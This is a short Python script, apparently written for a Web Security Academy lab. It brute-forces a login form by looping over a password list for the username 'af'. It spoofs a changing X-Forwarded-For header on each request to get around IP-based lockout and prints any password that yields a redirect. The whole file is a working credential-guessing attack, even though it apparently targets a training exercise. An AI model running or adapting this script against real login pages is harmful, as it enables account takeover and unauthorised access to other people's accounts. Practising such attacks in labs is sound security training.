import requests
import time

user=''
with open("users.txt", "r") as f:
	user=f.read()
	f.close()
passL = ''
with open("pass.txt", "r") as f:
	passL = f.read()
	f.close()
passL = list(passL.split('\n'))

# user = list(user.split('\n'))

proxy_server = {
	"http" : "http://127.0.0.1:8080",
	"https" : "http://127.0.0.1:8080"
}

url = "https://0a6f00140494cf2e8043b24f00a0009f.web-security-academy.net/login"

for p in passL:
	header = {
	"X-Forwarded-For" : f"127.0.{passL.index(p)+100}.0",
	"Cookie": "session=fESPlmdikcCSUwVM1zo1A5MftlsNcZyP",
	"Content-Type" : "application/x-www-form-urlencoded"
	}
	data = {
	"username" : "af",
	"password" : p
	}
	r = requests.post(url, data=data, headers=header)
	if r.status_code == 302:
		print(p)

	